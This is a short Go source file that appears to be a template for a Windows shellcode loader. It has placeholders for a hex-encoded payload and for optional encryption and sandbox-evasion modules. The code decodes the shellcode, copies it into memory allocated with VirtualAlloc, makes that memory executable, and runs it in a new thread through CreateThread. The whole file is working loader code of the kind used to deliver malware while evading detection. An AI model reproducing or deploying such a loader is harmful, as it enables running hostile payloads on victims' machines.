package main

import (
	"encoding/hex"
	"golang.org/x/sys/windows"
	"unsafe"
	//__ENCRYPTMODULE__
	//__SANDBOXMODULE__
)

const (
	MemCommit       = 0x1000
	MemReserve      = 0x2000
	PageExecuteRead = 0x20
	PageReadwrite   = 0x04
)

func main() {
	//__SANDBOX__
	shellcode, _ := hex.DecodeString("__SHELLCODE__")
	//__ENCRYPTCODE__
	address, _ := windows.VirtualAlloc(uintptr(0), uintptr(len(shellcode)), MemCommit|MemReserve, PageReadwrite)
	ntdll := windows.NewLazySystemDLL("ntdll.dll")
	RtlCopyMemory := ntdll.NewProc("RtlCopyMemory")
	_, _, _ = RtlCopyMemory.Call(address, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	var oldProtect uint32
	_ = windows.VirtualProtect(address, uintptr(len(shellcode)), PageExecuteRead, &oldProtect)
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	CreateThread := kernel32.NewProc("CreateThread")
	thread, _, _ := CreateThread.Call(0, 0, address, uintptr(0), 0, 0)
	_, _ = windows.WaitForSingleObject(windows.Handle(thread), 0xFFFFFFFF)
}
